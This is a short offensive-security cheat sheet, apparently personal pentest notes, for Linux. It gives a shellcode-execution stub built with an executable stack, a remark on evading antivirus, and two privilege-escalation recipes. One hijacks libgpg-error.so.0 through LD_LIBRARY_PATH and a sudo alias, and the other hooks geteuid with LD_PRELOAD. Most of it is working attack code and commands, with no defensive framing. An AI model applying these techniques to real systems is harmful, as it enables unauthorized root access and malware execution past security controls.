* Linux AV is bad with custom c binarys

## Shellcode execute
```
int (*ret)() = (int(*)())buf;
ret();
```
```
gcc -o example example.c -z execstack
```

## PE
* If there is auto task running with sudo, try hijacking
* may not works depends on secure path setting
* TODO: test cross compilation
* TODO: msf shell with\without encoder
* Worked: normal without encoder + on target


### libgpg-error.so.0
```
export LD_LIBRARY_PATH=[path to libgpg-error.so.0's folder]
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print $8}' | sed 's/@@GPG_ERROR_1.0/;/g'
```
```
gcc -Wall -fPIC -c -o test.o test.c
gcc -shared -Wl,--version-script [path to symbol map file ] -o libgpg-error.so.0 test.o
```
```
alias sudo="sudo LD_LIBRARY_PATH=[path to libgpg-error.so.0's folder]"
```


### geteuid
```
gcc -Wall -fPIC -z execstack -c -o test.o test.c
gcc -shared -o test.so test.o -ldl
export LD_PRELOAD=[path to so file]
```
* triger
```
cp /etc/passwd /tmp/test
```

